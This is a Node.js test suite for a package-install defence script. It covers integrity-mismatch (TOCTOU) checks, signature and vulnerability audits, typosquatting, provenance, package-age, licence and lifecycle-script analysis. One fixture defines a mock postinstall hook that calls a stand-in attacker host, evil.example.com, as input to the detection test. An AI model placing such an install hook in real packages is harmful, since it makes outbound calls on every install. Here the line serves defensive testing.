#!/usr/bin/env node
'use strict'

const { describe, test, beforeEach, afterEach } = require('node:test')
const assert = require('node:assert/strict')
const path = require('node:path')

const SCRIPT_PATH = path.resolve(__dirname, './add-package.js')

let captured = { logs: [], errors: [] }
let exitCode = null

function readScriptExports() {
  delete require.cache[require.resolve(SCRIPT_PATH)]
  return require(SCRIPT_PATH)
}

function resetCaptured() {
  captured = { logs: [], errors: [] }
  exitCode = null
}

function captureConsole() {
  const originalLog = console.log
  const originalError = console.error
  console.log = (...args) => {
    captured.logs.push(args.join(' '))
    originalLog.apply(console, args)
  }
  console.error = (...args) => {
    captured.errors.push(args.join(' '))
    originalError.apply(console, args)
  }
  return () => {
    console.log = originalLog
    console.error = originalError
  }
}

function makeMockFetchRegistryJson(responses) {
  return async (_name, _version, _options) => {
    const responseKey = `${_name}@${_version}`
    const response = responses[responseKey] ??
      responses[_name] ?? { statusCode: 404, body: {} }

    if (response.error) throw response.error
    if (response.statusCode && response.statusCode !== 200) {
      const err = new Error(`HTTP ${response.statusCode}`)
      err.statusCode = response.statusCode
      throw err
    }
    return response.body ?? response
  }
}

function makeMockFs(files) {
  return {
    readFileSync: (filePath, encoding) => {
      if (files[filePath] !== undefined) {
        if (Buffer.isBuffer(files[filePath])) return files[filePath]
        if (encoding === 'utf8') return files[filePath]
        return Buffer.from(files[filePath])
      }
      const err = new Error(`ENOENT: ${filePath}`)
      err.code = 'ENOENT'
      throw err
    },
  }
}

function makeMockConfig(overrides = {}) {
  return {
    pkgAgeCheck: {
      minAgeDays: 30,
      registryTimeoutMs: 5000,
      maxResponseMB: 5,
    },
    updateCheck: {
      cacheTtlHours: 24,
      retryMaxAttempts: 3,
      retryInitialDelayMs: 250,
      retryBackoffMultiplier: 2,
      retryMaxDelayMs: 10000,
    },
    defences: {
      typosquattingThreshold: 2,
      internalPackageNames: [],
      provenanceMode: 'warn',
    },
    lifecycleScriptAnalysis: {
      enabled: true,
      failOn: 'high',
    },
    ...overrides,
  }
}

describe('add-package', () => {
  beforeEach(() => {
    resetCaptured()
  })

  afterEach(() => {
    const mod = readScriptExports()
    mod.resetSpawnSyncImpl()
    mod.resetFetchRegistryJsonImpl()
    mod.resetFsImpl()
    mod.resetTyposquattingImpl()
    mod.resetProvenanceImpl()
    mod.resetScriptAnalyzerImpl()
    mod.resetLoadConfigImpl()
  })

  test('main blocks install when tarball integrity mismatches after install (TOCTOU)', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: {
            dist: {
              integrity:
                'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
            },
          },
        },
      }),
    )

    // Default typosquatting/provenance behaviour should not interfere.
    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': {
              integrity:
                'sha512-badintegrity0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
            },
          },
        }),
      }),
    )

    const spawnCalls = []
    mod.setSpawnSyncImpl((cmd, args, _opts) => {
      spawnCalls.push({ cmd, args })
      if (cmd === 'npm' && args[0] === 'install') {
        return { status: 0 }
      }
      if (cmd === 'npm' && args[0] === 'audit') {
        return { status: 0 }
      }
      return { status: 0 }
    })

    // Patch fetchPackageAge to return a valid age without network.
    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) => line.includes('Integrity mismatch')),
      )
      assert.ok(
        spawnCalls.some(
          (call) => call.cmd === 'npm' && call.args[0] === 'install',
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main passes when installed integrity matches registry (TOCTOU protected)', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()

    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    // Neutralize typosquatting/provenance checks for the happy-path test.
    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )

    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm') {
        if (args[0] === 'install' || args[0] === 'audit') return { status: 0 }
        if (args[0] === 'run' && args[1] === 'defence:pkg-age-check')
          return { status: 0 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:0/,
      )
      assert.equal(exitCode, 0)
      assert.ok(
        captured.logs.some((line) =>
          line.includes('installed integrity matches registry'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('fetchVersionManifest returns parsed registry response', async () => {
    const mod = readScriptExports()
    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'lodash@4.17.21': {
          statusCode: 200,
          body: {
            name: 'lodash',
            version: '4.17.21',
            dist: { integrity: 'sha512-abc' },
          },
        },
      }),
    )

    const manifest = await mod.fetchVersionManifest('lodash', '4.17.21')
    assert.equal(manifest.name, 'lodash')
    assert.equal(manifest.dist.integrity, 'sha512-abc')
  })

  test('fetchVersionManifest rejects on HTTP error', async () => {
    const mod = readScriptExports()
    mod.setLoadConfigImpl(() => makeMockConfig())
    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'missing-pkg@1.0.0': { statusCode: 404, body: {} },
      }),
    )

    await assert.rejects(
      () => mod.fetchVersionManifest('missing-pkg', '1.0.0'),
      /HTTP 404/,
    )
  })

  test('verifyInstalledIntegrity throws when lockfile integrity mismatches', async () => {
    const mod = readScriptExports()
    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/x': { integrity: 'sha512-a' },
          },
        }),
      }),
    )

    await assert.rejects(
      () => mod.verifyInstalledIntegrity('x', '1.0.0', 'sha512-b'),
      /Integrity mismatch/,
    )
  })

  test('main fails when signature audit fails', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    // Prevent typosquatting/provenance side effects from altering failure path.
    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )

    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit' && args[1] === 'signatures') {
        return { status: 1 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) =>
          line.includes('Signature verification failed'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main fails when vulnerability audit fails', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit' && args[1] === 'signatures') {
        return { status: 0 }
      }
      if (
        cmd === 'npm' &&
        args[0] === 'audit' &&
        args[1] === '--audit-level=high'
      ) {
        return { status: 1 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) =>
          line.includes('Vulnerability audit FAILED'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main aborts when typosquatting conflict is detected', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'saafe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => ['safe-pkg'],
      findConflicts: (_name, _options) => [
        {
          type: 'typosquatting',
          name: 'saafe-pkg',
          existing: 'safe-pkg',
          distance: 1,
        },
      ],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: true,
        valid: true,
        reason: 'verified',
      }),
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['saafe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) =>
          line.includes('Potential typosquatting'),
        ),
      )
      assert.ok(captured.errors.some((line) => line.includes('safe-pkg')))
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main aborts in strict provenance mode when attestation is missing', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() =>
      makeMockConfig({ defences: { provenanceMode: 'strict' } }),
    )

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'missing attestation',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit' && args[1] === 'signatures') {
        return { status: 0 }
      }
      if (
        cmd === 'npm' &&
        args[0] === 'audit' &&
        args[1] === '--audit-level=high'
      ) {
        return { status: 0 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) => line.includes('strict provenance mode')),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main warns but continues in warn provenance mode when attestation is missing', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'missing attestation',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit' && args[1] === 'signatures') {
        return { status: 0 }
      }
      if (
        cmd === 'npm' &&
        args[0] === 'audit' &&
        args[1] === '--audit-level=high'
      ) {
        return { status: 0 }
      }
      if (
        cmd === 'npm' &&
        args[0] === 'run' &&
        args[1] === 'defence:pkg-age-check'
      ) {
        return { status: 0 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:0/,
      )
      assert.equal(exitCode, 0)
      assert.ok(
        captured.logs.some((line) =>
          line.includes('No provenance attestation'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main fails when transitive package-age check fails', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit') return { status: 0 }
      if (
        cmd === 'npm' &&
        args[0] === 'run' &&
        args[1] === 'defence:pkg-age-check'
      ) {
        return { status: 1 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) =>
          line.includes('Transitive package-age check FAILED'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main fails when dependency license check fails', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit') return { status: 0 }
      if (
        cmd === 'npm' &&
        args[0] === 'run' &&
        args[1] === 'defence:license-check:fail'
      ) {
        return { status: 1 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) =>
          line.includes('Dependency license check FAILED'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main aborts when high-risk lifecycle scripts are detected', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'risky-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })
    mod.setScriptAnalyzerImpl({
      analyzeManifest: () => ({
        package: 'risky-pkg@1.0.0',
        scripts: { postinstall: "fetch('https://evil.example.com')" },
        findings: [
          {
            package: 'risky-pkg@1.0.0',
            script: 'postinstall',
            level: 'high',
            pattern: 'network-outbound',
            message: 'makes an outbound network request',
          },
        ],
        hasLifecycleScripts: true,
        riskLevel: 'high',
      }),
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['risky-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:1/,
      )
      assert.equal(exitCode, 1)
      assert.ok(
        captured.errors.some((line) =>
          line.includes('Lifecycle script analysis FAILED'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main continues when lifecycle scripts are safe', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() => makeMockConfig())

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })
    mod.setScriptAnalyzerImpl({
      analyzeManifest: () => ({
        package: 'safe-pkg@1.0.0',
        scripts: {},
        findings: [],
        hasLifecycleScripts: false,
        riskLevel: 'none',
      }),
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit') return { status: 0 }
      if (
        cmd === 'npm' &&
        args[0] === 'run' &&
        args[1] === 'defence:pkg-age-check'
      ) {
        return { status: 0 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:0/,
      )
      assert.equal(exitCode, 0)
      assert.ok(
        captured.logs.some((line) =>
          line.includes('No lifecycle scripts found'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })

  test('main skips lifecycle analysis when disabled', async () => {
    const mod = readScriptExports()
    const restoreConsole = captureConsole()
    const integrity =
      'sha512-goodintegrity00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

    mod.setLoadConfigImpl(() =>
      makeMockConfig({ lifecycleScriptAnalysis: { enabled: false } }),
    )

    mod.setFetchRegistryJsonImpl(
      makeMockFetchRegistryJson({
        'safe-pkg@1.0.0': {
          statusCode: 200,
          body: { dist: { integrity } },
        },
      }),
    )

    mod.setTyposquattingImpl({
      loadExistingNames: () => [],
      findConflicts: () => [],
    })
    mod.setProvenanceImpl({
      checkProvenance: async () => ({
        hasProvenance: false,
        valid: false,
        reason: 'not checked',
      }),
    })

    // If analysis is skipped, the analyzer should not be invoked.
    mod.setScriptAnalyzerImpl({
      analyzeManifest: () => {
        throw new Error('analyzer should not be called')
      },
    })

    mod.setFsImpl(
      makeMockFs({
        [path.resolve(process.cwd(), 'package-lock.json')]: JSON.stringify({
          packages: {
            'node_modules/safe-pkg': { integrity },
          },
        }),
      }),
    )
    mod.setSpawnSyncImpl((cmd, args) => {
      if (cmd === 'npm' && args[0] === 'install') return { status: 0 }
      if (cmd === 'npm' && args[0] === 'audit') return { status: 0 }
      if (
        cmd === 'npm' &&
        args[0] === 'run' &&
        args[1] === 'defence:pkg-age-check'
      ) {
        return { status: 0 }
      }
      return { status: 0 }
    })

    const checkPackageAge = require(
      path.resolve(__dirname, './check-package-age.js'),
    )
    const originalFetchPackageAge = checkPackageAge.fetchPackageAge
    checkPackageAge.fetchPackageAge = () =>
      Promise.resolve({
        ageDays: 30,
        published: new Date('2026-08-01T00:00:00.000Z'),
      })

    try {
      await assert.rejects(
        async () =>
          mod.main(['safe-pkg@1.0.0'], (code) => {
            exitCode = code
            throw new Error(`exit:${code}`)
          }),
        /exit:0/,
      )
      assert.equal(exitCode, 0)
      assert.ok(
        !captured.logs.some((line) =>
          line.includes('Analyzing lifecycle scripts'),
        ),
      )
    } finally {
      checkPackageAge.fetchPackageAge = originalFetchPackageAge
      restoreConsole()
    }
  })
})
